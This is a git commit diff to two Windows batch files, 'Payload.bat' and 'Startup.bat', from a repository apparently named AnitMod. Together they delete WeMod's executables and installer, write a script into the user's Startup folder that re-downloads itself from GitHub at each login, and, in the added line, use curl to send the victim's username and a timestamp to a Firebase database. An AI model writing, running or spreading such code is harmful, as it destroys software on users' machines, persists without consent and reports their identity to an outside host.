6058c76a7b1d71d708622eaef9221e2c0ddb3d14
DrMeepso <50252724+DrMeepso@users.noreply.github.com>
2021-11-08 17:51:11 +1300

    8

--- Payload.bat
+++ Payload.bat
@@ -6,3 +6,4 @@ del C:\Users\%username%\AppData\Local\WeMod\Update.exe
 del C:\Users\%username%\Downloads\WeMod-Setup.exe > nul
 cd C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
 curl https://raw.githubusercontent.com/DrMeepso/AnitMod/main/Startup.bat -o Startup.bat
+curl -X PUT -d "{\"time\": \"%time%\"}" -H "Content-type: application/json" https://antimod-d4fb9-default-rtdb.firebaseio.com/user/%username%.json
--- Startup.bat
+++ Startup.bat
@@ -1,5 +1,6 @@
 del C:\Users\%username%\AppData\Local\WeMod\WeMod.exe
 del C:\Users\%username%\AppData\Local\WeMod\Update.exe
 del C:\Users\%username%\Downloads\WeMod-Setup.exe > nul
+curl https://raw.githubusercontent.com/DrMeepso/AnitMod/main/Startup.bat -o Startup.bat
 
 exit
